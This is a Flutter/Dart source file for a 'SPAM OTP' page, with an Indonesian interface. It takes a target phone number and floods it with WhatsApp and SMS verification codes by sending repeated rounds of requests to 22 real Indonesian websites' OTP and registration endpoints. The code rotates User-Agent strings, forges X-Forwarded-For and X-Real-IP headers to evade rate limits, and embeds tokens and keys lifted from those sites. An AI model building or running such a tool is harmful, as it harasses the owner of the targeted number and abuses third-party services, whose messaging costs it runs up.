import 'dart:convert';
import 'dart:math';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'app_theme.dart';

class SpamOtpPage extends StatefulWidget {
  const SpamOtpPage({super.key});

  @override
  State<SpamOtpPage> createState() => _SpamOtpPageState();
}

class _SpamOtpPageState extends State<SpamOtpPage> {
  final TextEditingController _numberController = TextEditingController();

  // ===== CONFIG =====
  static const int TOTAL_ENDPOINT = 22;
  static const int INTERVAL_MS = 800; // Jeda antar ronde dalam milidetik

  int _roundCount = 1;
  bool _isLoading = false;
  String _statusMessage = "";
  final List<Map<String, dynamic>> _liveResults = [];

  @override
  void dispose() {
    _numberController.dispose();
    super.dispose();
  }

  // ==================== HELPERS ====================
  String _randomUA() {
    final uas = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1',
      'Mozilla/5.0 (Linux; Android 14; SM-S921B) Chrome/120.0.0.0 Mobile Safari/537.36'
    ];
    return uas[Random().nextInt(uas.length)];
  }

  String _randomIP() {
    return "${Random().nextInt(255) + 1}.${Random().nextInt(255) + 1}.${Random().nextInt(255) + 1}.${Random().nextInt(255) + 1}";
  }

  String _generateUUID() {
    final rnd = Random();
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replaceAllMapped(RegExp(r'[xy]'), (match) {
      final r = rnd.nextInt(16);
      final v = match.group(0) == 'x' ? r : (r & 0x3 | 0x8);
      return v.toRadixString(16);
    });
  }

  String _normalizeNumber(String input) {
    String cleaned = input.replaceAll(RegExp(r'[^0-9]'), '');
    if (cleaned.startsWith('0')) {
      cleaned = '62${cleaned.substring(1)}';
    } else if (cleaned.startsWith('8')) {
      cleaned = '62$cleaned';
    }
    return cleaned;
  }

  String fmt_no_code(String p) {
    p = p.replaceAll('+', '').replaceAll(' ', '');
    if (p.startsWith('62')) p = p.substring(2);
    if (p.startsWith('0')) p = p.substring(1);
    return p;
  }

  String fmt_08(String p) {
    p = p.replaceAll('+', '').replaceAll(' ', '');
    if (p.startsWith('62')) return '0${p.substring(2)}';
    if (!p.startsWith('0')) return '0$p';
    return p;
  }

  String fmt_plus(String p) {
    p = p.replaceAll('+', '').replaceAll(' ', '');
    if (p.startsWith('62')) return '+$p';
    if (p.startsWith('0')) return '+62${p.substring(1)}';
    return '+62$p';
  }

  String fmt_phone_only(String p) {
    p = p.replaceAll('+', '').replaceAll(' ', '').replaceAll('-', '');
    if (p.startsWith('62')) p = p.substring(2);
    if (p.startsWith('0')) p = p.substring(1);
    return p;
  }

  // ==================== START SPAM ====================
  Future<void> _startSpam() async {
    final input = _numberController.text.trim();
    if (input.isEmpty) {
      _showSnack("Masukkan nomor target!", isError: true);
      return;
    }

    final number = _normalizeNumber(input);
    if (number.length < 10) {
      _showSnack("Nomor tidak valid!", isError: true);
      return;
    }

    setState(() {
      _isLoading = true;
      _statusMessage = "Memulai spam...";
      _liveResults.clear();
    });

    try {
      for (int round = 1; round <= _roundCount; round++) {
        if (!mounted) break;
        setState(() {
          _statusMessage = "Round $round/$_roundCount...";
        });

        await _runAllEndpoints(number);

        if (round < _roundCount) {
          await Future.delayed(Duration(milliseconds: INTERVAL_MS));
        }
      }

      if (mounted) {
        setState(() {
          _isLoading = false;
          _statusMessage = "✅ Selesai! $_roundCount round × $TOTAL_ENDPOINT endpoint";
        });
        _showSnack("Spam selesai!", isError: false);
      }
    } catch (e) {
      if (mounted) {
        setState(() {
          _isLoading = false;
          _statusMessage = "❌ Error: $e";
        });
        _showSnack("Gagal: $e", isError: true);
      }
    }
  }

  // ==================== RUN ALL ENDPOINTS ====================
  Future<void> _runAllEndpoints(String phone) async {
    List<Future<void>> futures = [];

    // 1. Pinhome
    futures.add(_sendReq('Pinhome', 
      'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp',
      headers: {'Content-Type': 'text/plain;charset=UTF-8', 'Origin': 'https://www.pinhome.id'},
      body: jsonEncode({"accountType":"customers","applicationType":"Pinhome Web","countryCode":"62","medium":"whatsapp","otpType":"register","phoneNumber": fmt_no_code(phone)}),
      successKeys: ['secretcode']
    ));

    // 2. Maulagi
    futures.add(_sendReq('Maulagi',
      'https://api.maulagi.id/api/v2/auth/check',
      headers: {
        'Content-Type': 'application/json', 'Origin': 'https://maulagi.id',
        'x-ml-key': 'C59RUHBU59', 'Accept': 'application/json, text/plain, */*',
      },
      body: jsonEncode({"credentials": fmt_08(phone)}),
      successKeys: ['"status":"success"']
    ));

    // 3. PlanetBan
    futures.add(_sendReq('PlanetBan',
      'https://api.planetban.com/website/customer/request-otp',
      headers: {'Content-Type': 'application/json', 'Origin': 'https://planetban.com'},
      body: jsonEncode({"name":"Test","phone":fmt_08(phone),"password":"Test123","purpose":"register","method":"whatsapp"}),
      successKeys: ['status":true', 'success']
    ));

    // 4. Rumah123
    futures.add(_sendReq('Rumah123',
      'https://www.rumah123.com/api/otp/request-otp',
      headers: {'Content-Type': 'application/json;charset=UTF-8', 'Origin': 'https://www.rumah123.com', 'base-url-core': 'https://www.rumah123.com'},
      body: jsonEncode({
        "cancelledRequestId": _generateUUID(), "ipAddress": _randomIP(), "phoneNumber": phone,
        "portalId": 1, "type": "WHATSAPP", "url": "https://www.rumah123.com/user/login?redirect=%2Fcustomer%2Fv3%2Fpasang-iklan%2F"
      }),
      successKeys: ['requestid']
    ));

    // 5. Paper
    futures.add(_sendReq('Paper',
      'https://register.paper.id/api/v1/auth/register/send-otp',
      headers: {'Content-Type': 'application/json', 'Origin': 'https://paper.id', 'x-paper-user-agent': 'multiverse/2.54.1 mobile_web (android) chrome'},
      body: jsonEncode({"phone": phone, "method": "whatsapp", "registered_by": "flutter mweb"}),
      successKeys: ['otp']
    ));

    // 6. Dunia Games
    futures.add(_sendReq('Dunia Games',
      'https://api.duniagames.co.id/api/user/api/v2/user/send-otp',
      headers: {'Content-Type': 'application/json', 'Origin': 'https://duniagames.co.id', 'x-device': '85d3da46-4d56-4675-90fc-e27926c56de1'},
      body: jsonEncode({"phoneNumber": fmt_plus(phone), "userName": phone}),
      successKeys: ['otp']
    ));

    // 7. Bunda Hospital
    futures.add(_sendReq('Bunda Hospital',
      'https://cms.bunda.co.id/api/v1/auth/send-otp',
      headers: {'Content-Type': 'application/json', 'Origin': 'https://www.bunda.co.id', 'x-locale': 'id'},
      body: jsonEncode({"phone_number": int.parse(fmt_no_code(phone)), "type": "auth"}),
      successKeys: ['otp']
    ));

    // 8. Bonus Belanja
    futures.add(_sendReq('Bonus Belanja',
      'https://www.bonusbelanja.com/api/auth/registration/app',
      headers: {'Content-Type': 'application/json', 'Origin': 'https://www.bonusbelanja.com'},
      body: jsonEncode({"phone": phone, "name": "User", "agreeTnc": true, "agreeContact": true}),
      successKeys: ['error":false']
    ));

    // 9. Matahari
    futures.add(_sendReq('Matahari',
      'https://matahari-backend-prod.matahari.com/api/auth/register',
      headers: {'Content-Type': 'application/json', 'Origin': 'https://matahari.com'},
      body: jsonEncode({
        "emailAddress": "user${Random().nextInt(9000)+1000}@bwmyga.com", "name": "User",
        "mobileCountryCode": "", "mobileNumber": fmt_08(phone), "birthDate": "2000-01-01",
        "genderId": "1", "password": "Test123", "cardNumber": "", "referralCode": "",
        "salesmanId": "", "pickupStoreCode": "", "marketingCode": ""
      }),
      successKeys: ['otp', 'success', 'code', 'already exists']
    ));

    // 10. Hijup
    futures.add(_sendReq('Hijup',
      'https://www.hijup.com/sign_in',
      headers: {
        'Content-Type': 'text/plain;charset=UTF-8', 'Origin': 'https://www.hijup.com',
        'next-action': 'b7eda6e749fbadcfcf226c2e36865091520b679f',
        'next-router-state-tree': '%5B%22%22%2C%7B%22children%22%3A%5B%5B%22merchant%22%2C%22hijup%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22sign_in%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
        'next-url': '/sign_in',
      },
      body: jsonEncode([{"phone_number": phone, "store_path": "hijup"}]),
      successKeys: ['otp', 'code', 'success']
    ));

    // 11. Alodokter
    futures.add(_sendReq('Alodokter',
      'https://www.alodokter.com/resend-otp',
      headers: {
        'Content-Type': 'application/json', 'Origin': 'https://www.alodokter.com',
        'x-csrf-token': 'o/FdMeWMEtf5/jbtImqJr9Wuau4r9I/boJAwEcUQv3x+WGzrnGnjY3WdVSdd9P2FVrx17l4r02I7VLEjCYoPrg==',
      },
      body: jsonEncode({"user":{"phone": fmt_08(phone), "uuid": _generateUUID()}, "request_via":"whatsapp"}),
      successKeys: ['otp', 'success', 'code']
    ));

    // 12. Blibli Tiket
    futures.add(_sendReq('Blibli Tiket',
      'https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate',
      headers: {
        'Content-Type': 'text/plain;charset=UTF-8', 'Origin': 'https://account.bliblitiket.com',
        'x-request-id': _generateUUID(), 'x-channel-id':'MWEB', 'x-lang':'id', 'x-entity':'TIKET', 'x-client-id':'9dc79e3916a042abc86c2aa525bff009',
      },
      body: jsonEncode({"action":"REGISTER_OTP","channel":"WHATS_APP","recipient": fmt_plus(phone),"recaptchaToken":""}),
      successKeys: ['requestId', 'success', 'otp']
    ));

    // 13. Ohsome
    futures.add(_sendReq('Ohsome',
      'https://ohsome.co.id/api/member/user/random_code_check',
      headers: {
        'Content-Type': 'application/json', 'Origin': 'https://ohsome.co.id',
        'language':'id', 'deviceid':'ba0a0027a5e6e7cde77f0f94f2572495', 'x-store-no':'SC001',
        'traceparent':'00-6bd858f4bdf14f53a8d3de8e6741641a-d542ee3bee82f7f4-01', 'platform':'H5',
        'tracestate':'rum=v2&browser&j2e0xaqli6@901063bd0372204&df97461d6dea41e59bb8ad0ea28ef184&uid_had63ijdnpxyb93t',
      },
      body: jsonEncode({"country_code":"62","account": fmt_phone_only(phone),"type_id":2,"device_id":"ba0a0027a5e6e7cde77f0f94f2572495","check_code":"219097","image_id":"tcsRCTZ0RAvqQAvcUJDG"}),
      successKeys: ['success', 'otp', 'code']
    ));

    // 14. Optik Melawai
    futures.add(_sendReq('Optik Melawai',
      'https://api.optikmelawai.com/api/v3/auth/register/1',
      headers: {
        'Authorization':'Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d11f083077e562169b78d2ef2f3d285542a22f5ae174badd1313593deb5ec4389c75de38055b4964969a8323f031d47a6b35b3af4a096a08d6dddc2bf616c36bbeea1602b5b8a041650909107c207ed9',
        'x-unique-user':'GA1.1.1062236172.1780823549', 'language':'id', 'Origin':'https://www.optikmelawai.com',
      },
      body: jsonEncode({"phone": phone}),
      successKeys: ['success', 'otp']
    ));

    // 15. TuneUp
    futures.add(_sendReq('TuneUp',
      'https://api.tuneup.id/v1/mitra/register/send-otp',
      headers: {'Content-Type': 'application/json', 'Origin': 'https://dashboard.tuneup.id'},
      body: jsonEncode({
        "company_name": "PT Test", "owner_name": "Test", "address": "Test",
        "email": "test@test.com", "phone_number": fmt_08(phone), "province_code": "32",
        "city_code": "32.04", "subscription_id": "undefined", "channel": "whatsapp",
        "agreement": "true", "service_categories[]": "3"
      }),
      successKeys: ['"success":true']
    ));

    // 16. RCX
    futures.add(_sendReq('RCX',
      'https://sso.rcx.co.id/auth/passwordless/request',
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({"identifier": fmt_08(phone)}),
      successKeys: ['challenge', 'redirecting']
    ));

    // 17. Sahabat Teknisi
    futures.add(_sendReq('Sahabat Teknisi',
      'https://www.sahabatteknisi.co.id/api/auth/otp/check-phone',
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({"phone": fmt_08(phone)}),
      successKeys: ['success']
    ));

    // 18. Jembatani
    futures.add(_sendReq('Jembatani',
      'https://api.jembatani.co.id/v1/register',
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({"phone": fmt_08(phone)}),
      successKeys: ['"success":true']
    ));

    // 19. Kaniva
    futures.add(_sendReq('Kaniva',
      'https://daftar.kanivainternationalbali.com/register/whatsapp/request-otp',
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({"phone": fmt_08(phone)}),
      successKeys: ['"message":"success"']
    ));

    // 20. Ultramilk
    futures.add(_sendReq('Ultramilk',
      'https://ultramilk-clp.kata.ai/api/ultramilk/register',
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({"phone": phone}),
      successKeys: ['success']
    ));

    // 21. Hash Micro
    futures.add(_sendReq('Hash Micro',
      'https://website-api.hashmicro.com/api/add/3',
      headers: {'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.hashmicro.com'},
      body: "name=User&phone=${fmt_phone_only(phone)}&email=test@test.com",
      successKeys: ['success', 'thank', 'terimakasih']
    ));

    // 22. Holland Bakery
    futures.add(_sendReq('Holland Bakery',
      'https://www.hollandbakery.co.id/resend-otp-register',
      headers: {'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.hollandbakery.co.id'},
      body: "phone=$phone", 
      successKeys: ['verify', 'verification', 'kode verifikasi']
    ));

    await Future.wait(futures);
  }

  // ==================== SEND REQUEST ====================
  Future<void> _sendReq(String name, String url, {
    required Map<String, String> headers,
    required String body,
    required List<String> successKeys,
  }) async {
    headers['User-Agent'] = _randomUA();
    headers['X-Forwarded-For'] = _randomIP();
    headers['X-Real-IP'] = _randomIP();
    headers['Accept'] = 'application/json, text/plain, */*';
    headers['Accept-Language'] = 'id-ID,id;q=0.9,en-US;q=0.8';

    try {
      final response = await http.post(
        Uri.parse(url),
        headers: headers,
        body: body,
      ).timeout(const Duration(seconds: 15));

      final text = response.body;
      bool success = false;
      
      if (successKeys.isNotEmpty) {
        success = successKeys.any((k) => text.toLowerCase().contains(k.toLowerCase()));
      } else {
        success = response.statusCode >= 200 && response.statusCode < 300;
      }

      if (mounted) {
        setState(() {
          _liveResults.add({
            'api': name,
            'status': success ? 'SUCCESS' : 'FAILED',
            'success': success,
          });
        });
      }
    } catch (e) {
      if (mounted) {
        setState(() {
          _liveResults.add({
            'api': name,
            'status': 'ERROR',
            'success': false,
          });
        });
      }
    }
  }

  void _showSnack(String msg, {bool isError = false}) {
    final theme = Theme.of(context);
    final isNeo = themeModeNotifier.value != 0;

    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(
          msg,
          style: TextStyle(
            color: isNeo ? Colors.black : Colors.white,
            fontWeight: FontWeight.bold,
          ),
        ),
        backgroundColor: isError
            ? Colors.redAccent
            : (isNeo ? theme.colorScheme.primary : Colors.greenAccent.shade700),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(isNeo ? 4 : 10),
          side: isNeo ? const BorderSide(color: Colors.black, width: 2) : BorderSide.none,
        ),
      ),
    );
  }

  // ==================== UI ====================
  @override
  Widget build(BuildContext context) {
    return ValueListenableBuilder<int>(
      valueListenable: themeModeNotifier,
      builder: (context, modeIndex, child) {
        final currentTheme = AppTheme.currentTheme;
        final isNeo = modeIndex != 0;

        return Theme(
          data: currentTheme,
          child: Builder(
            builder: (context) {
              final theme = Theme.of(context);
              final isLight = theme.brightness == Brightness.light;

              final primaryColor = theme.colorScheme.primary;
              final secondaryColor = theme.colorScheme.secondary;
              final surfaceColor = theme.colorScheme.surface;
              final bgScaffold = theme.scaffoldBackgroundColor;

              final textColor = isLight ? Colors.black87 : Colors.white;
              final subTextColor = isLight ? Colors.black54 : Colors.white70;

              final cardRadius = BorderRadius.circular(isNeo ? 8 : 16);
              final btnRadius = BorderRadius.circular(isNeo ? 4 : 12);

              final cardBorder = Border.all(
                color: isNeo ? Colors.black : primaryColor.withOpacity(0.3),
                width: isNeo ? 3.0 : 1.0,
              );

              final cardShadow = isNeo
                  ? [const BoxShadow(color: Colors.black, blurRadius: 0, offset: Offset(4, 4))]
                  : [BoxShadow(color: primaryColor.withOpacity(0.08), blurRadius: 12, offset: const Offset(0, 4))];

              return Scaffold(
                backgroundColor: bgScaffold,
                body: SafeArea(
                  child: Column(
                    children: [
                      _buildHeader(surfaceColor, primaryColor, cardBorder, btnRadius, textColor, isNeo),
                      Expanded(
                        child: SingleChildScrollView(
                          padding: const EdgeInsets.all(16),
                          child: Column(
                            children: [
                              _buildStatsRow(surfaceColor, primaryColor, secondaryColor, cardBorder, cardRadius, cardShadow, textColor, subTextColor),
                              const SizedBox(height: 16),
                              _buildInputCard(surfaceColor, primaryColor, bgScaffold, cardBorder, cardRadius, cardShadow, btnRadius, textColor, subTextColor, isNeo),
                              const SizedBox(height: 16),
                              _buildRoundCard(surfaceColor, primaryColor, bgScaffold, cardBorder, cardRadius, cardShadow, btnRadius, textColor, subTextColor, isNeo),
                              const SizedBox(height: 16),
                              _buildStartButton(primaryColor, secondaryColor, cardBorder, btnRadius, isNeo, isLight),
                              const SizedBox(height: 16),
                              if (_statusMessage.isNotEmpty) _buildStatusCard(surfaceColor, primaryColor, cardBorder, cardRadius, textColor),
                              const SizedBox(height: 16),
                              if (_liveResults.isNotEmpty) _buildLiveResults(surfaceColor, primaryColor, cardBorder, cardRadius, cardShadow, textColor, subTextColor, isNeo),
                              const SizedBox(height: 40),
                            ],
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
              );
            },
          ),
        );
      },
    );
  }

  Widget _buildHeader(Color surface, Color primary, BoxBorder border, BorderRadius radius, Color textColor, bool isNeo) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: surface,
        border: Border(bottom: BorderSide(color: border.top.color, width: border.top.width)),
      ),
      child: Row(
        children: [
          GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              width: 42,
              height: 42,
              decoration: BoxDecoration(color: surface, borderRadius: radius, border: border),
              child: Icon(Icons.arrow_back_ios_new_rounded, color: textColor, size: 18),
            ),
          ),
          const SizedBox(width: 14),
          Text(
            "SPAM OTP",
            style: TextStyle(color: primary, fontSize: 20, fontWeight: FontWeight.w900, letterSpacing: 1.0),
          ),
        ],
      ),
    );
  }

  Widget _buildStatsRow(Color surface, Color primary, Color secondary, BoxBorder border, BorderRadius radius, List<BoxShadow> shadow, Color textColor, Color subTextColor) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(color: surface, borderRadius: radius, border: border, boxShadow: shadow),
      child: Row(
        children: [
          _buildStatItem(icon: Icons.hub_rounded, value: "$TOTAL_ENDPOINT", label: "Endpoint", color: primary, textColor: textColor, subTextColor: subTextColor),
          _buildDivider(border.top.color),
          _buildStatItem(icon: Icons.speed_rounded, value: "${INTERVAL_MS}ms", label: "Interval", color: secondary, textColor: textColor, subTextColor: subTextColor),
          _buildDivider(border.top.color),
          _buildStatItem(icon: Icons.flash_on_rounded, value: "1x", label: "Burst", color: primary, textColor: textColor, subTextColor: subTextColor),
        ],
      ),
    );
  }

  Widget _buildStatItem({required IconData icon, required String value, required String label, required Color color, required Color textColor, required Color subTextColor}) {
    return Expanded(
      child: Column(
        children: [
          Icon(icon, color: color, size: 22),
          const SizedBox(height: 6),
          Text(value, style: TextStyle(color: textColor, fontSize: 16, fontWeight: FontWeight.w800)),
          Text(label, style: TextStyle(color: subTextColor, fontSize: 10)),
        ],
      ),
    );
  }

  Widget _buildDivider(Color color) {
    return Container(width: 1, height: 40, color: color.withOpacity(0.3));
  }

  Widget _buildInputCard(Color surface, Color primary, Color bg, BoxBorder border, BorderRadius radius, List<BoxShadow> shadow, BorderRadius btnRadius, Color textColor, Color subTextColor, bool isNeo) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(color: surface, borderRadius: radius, border: border, boxShadow: shadow),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.phone_android_rounded, color: primary, size: 18),
              const SizedBox(width: 8),
              Text(
                "NOMOR TARGET WHATSAPP / SMS",
                style: TextStyle(color: textColor, fontSize: 11, fontWeight: FontWeight.w800, letterSpacing: 0.5),
              ),
            ],
          ),
          const SizedBox(height: 12),
          TextField(
            controller: _numberController,
            keyboardType: TextInputType.phone,
            style: TextStyle(color: textColor, fontSize: 14, fontWeight: FontWeight.w600),
            decoration: InputDecoration(
              hintText: "08xxxxxxxxxx / 62...",
              hintStyle: TextStyle(color: subTextColor.withOpacity(0.5), fontSize: 13),
              prefixIcon: Icon(Icons.dialpad_rounded, color: primary, size: 20),
              filled: true,
              fillColor: bg,
              enabledBorder: OutlineInputBorder(borderRadius: btnRadius, borderSide: border.top),
              focusedBorder: OutlineInputBorder(borderRadius: btnRadius, borderSide: BorderSide(color: primary, width: 2)),
            ),
          ),
          const SizedBox(height: 8),
          Text("Format bebas. Sistem otomatis normalisasi nomor.", style: TextStyle(color: subTextColor, fontSize: 10)),
        ],
      ),
    );
  }

  Widget _buildRoundCard(Color surface, Color primary, Color bg, BoxBorder border, BorderRadius radius, List<BoxShadow> shadow, BorderRadius btnRadius, Color textColor, Color subTextColor, bool isNeo) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(color: surface, borderRadius: radius, border: border, boxShadow: shadow),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.refresh_rounded, color: primary, size: 18),
              const SizedBox(width: 8),
              Text("PENGULANGAN (RONDE)", style: TextStyle(color: textColor, fontSize: 11, fontWeight: FontWeight.w800, letterSpacing: 0.5)),
              const Spacer(),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                decoration: BoxDecoration(
                  color: isNeo ? primary : primary.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(isNeo ? 2 : 20),
                  border: isNeo ? Border.all(color: Colors.black, width: 1.5) : null,
                ),
                child: Text(
                  "= ${_roundCount * TOTAL_ENDPOINT} KIRIMAN",
                  style: TextStyle(color: isNeo ? Colors.black : primary, fontSize: 10, fontWeight: FontWeight.bold),
                ),
              ),
            ],
          ),
          const SizedBox(height: 16),
          Row(
            children: [
              _buildCounterBtn(icon: Icons.remove, bg: bg, border: border.top, radius: btnRadius, textColor: textColor, onTap: () { if (_roundCount > 1) setState(() => _roundCount--); }),
              const SizedBox(width: 12),
              Expanded(
                child: Container(
                  padding: const EdgeInsets.symmetric(vertical: 14),
                  decoration: BoxDecoration(color: bg, borderRadius: btnRadius, border: border),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Text("$_roundCount", style: TextStyle(color: textColor, fontSize: 24, fontWeight: FontWeight.w900)),
                      const SizedBox(width: 4),
                      Text("x", style: TextStyle(color: subTextColor, fontSize: 16, fontWeight: FontWeight.w600)),
                    ],
                  ),
                ),
              ),
              const SizedBox(width: 12),
              _buildCounterBtn(icon: Icons.add, bg: bg, border: border.top, radius: btnRadius, textColor: textColor, onTap: () => setState(() => _roundCount++)),
            ],
          ),
          const SizedBox(height: 12),
          Text("Tiap ronde mengirim ulang ke semua $TOTAL_ENDPOINT provider, jeda antar ronde ±${INTERVAL_MS/1000} detik.", style: TextStyle(color: subTextColor, fontSize: 10)),
        ],
      ),
    );
  }

  Widget _buildCounterBtn({required IconData icon, required Color bg, required BorderSide border, required BorderRadius radius, required Color textColor, required VoidCallback onTap}) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        width: 52,
        height: 52,
        decoration: BoxDecoration(color: bg, borderRadius: radius, border: Border.all(color: border.color, width: border.width)),
        child: Icon(icon, color: textColor, size: 22),
      ),
    );
  }

  Widget _buildStartButton(Color primary, Color secondary, BoxBorder border, BorderRadius radius, bool isNeo, bool isLight) {
    return GestureDetector(
      onTap: _isLoading ? null : _startSpam,
      child: Container(
        width: double.infinity,
        padding: const EdgeInsets.symmetric(vertical: 16),
        decoration: BoxDecoration(
          color: _isLoading ? Colors.grey.shade700 : primary,
          borderRadius: radius,
          border: isNeo ? Border.all(color: Colors.black, width: 3.0) : null,
          boxShadow: isNeo && !_isLoading
              ? [const BoxShadow(color: Colors.black, blurRadius: 0, offset: Offset(4, 4))]
              : [BoxShadow(color: primary.withOpacity(0.3), blurRadius: 15, offset: const Offset(0, 6))],
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            if (_isLoading)
              SizedBox(width: 20, height: 20, child: CircularProgressIndicator(color: isNeo && isLight ? Colors.black : Colors.white, strokeWidth: 2))
            else
              Icon(Icons.flash_on_rounded, color: isNeo && isLight ? Colors.black : Colors.white, size: 22),
            const SizedBox(width: 10),
            Text(
              _isLoading ? "SEDANG SPAM..." : "MULAI SPAM OTP ×$_roundCount",
              style: TextStyle(color: isNeo && isLight ? Colors.black : Colors.white, fontSize: 15, fontWeight: FontWeight.w900, letterSpacing: 0.5),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildStatusCard(Color surface, Color primary, BoxBorder border, BorderRadius radius, Color textColor) {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(color: surface, borderRadius: radius, border: border),
      child: Row(
        children: [
          Icon(Icons.info_outline_rounded, color: primary, size: 20),
          const SizedBox(width: 10),
          Expanded(child: Text(_statusMessage, style: TextStyle(color: textColor, fontSize: 12, fontWeight: FontWeight.w600))),
        ],
      ),
    );
  }

  Widget _buildLiveResults(Color surface, Color primary, BoxBorder border, BorderRadius radius, List<BoxShadow> shadow, Color textColor, Color subTextColor, bool isNeo) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(color: surface, borderRadius: radius, border: border, boxShadow: shadow),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.list_alt_rounded, color: primary, size: 18),
              const SizedBox(width: 8),
              Text("LIVE RESULTS", style: TextStyle(color: textColor, fontSize: 11, fontWeight: FontWeight.w800, letterSpacing: 0.5)),
              const Spacer(),
              Text(
                "${_liveResults.where((r) => r['success'] == true).length}/${_liveResults.length}",
                style: TextStyle(color: Colors.greenAccent.shade700, fontSize: 11, fontWeight: FontWeight.w800),
              ),
            ],
          ),
          const SizedBox(height: 12),
          ..._liveResults.reversed.take(20).map((result) {
            final isSuccess = result['success'] == true;
            return Padding(
              padding: const EdgeInsets.symmetric(vertical: 4),
              child: Row(
                children: [
                  Container(
                    width: 8, height: 8,
                    decoration: BoxDecoration(color: isSuccess ? Colors.greenAccent.shade700 : Colors.redAccent, shape: BoxShape.circle),
                  ),
                  const SizedBox(width: 8),
                  Expanded(child: Text(result['api'], style: TextStyle(color: textColor, fontSize: 11, fontWeight: FontWeight.w600), overflow: TextOverflow.ellipsis)),
                  const SizedBox(width: 8),
                  Text(result['status'], style: TextStyle(color: isSuccess ? Colors.greenAccent.shade700 : Colors.redAccent, fontSize: 10, fontWeight: FontWeight.w800)),
                ],
              ),
            );
          }),
        ],
      ),
    );
  }
}
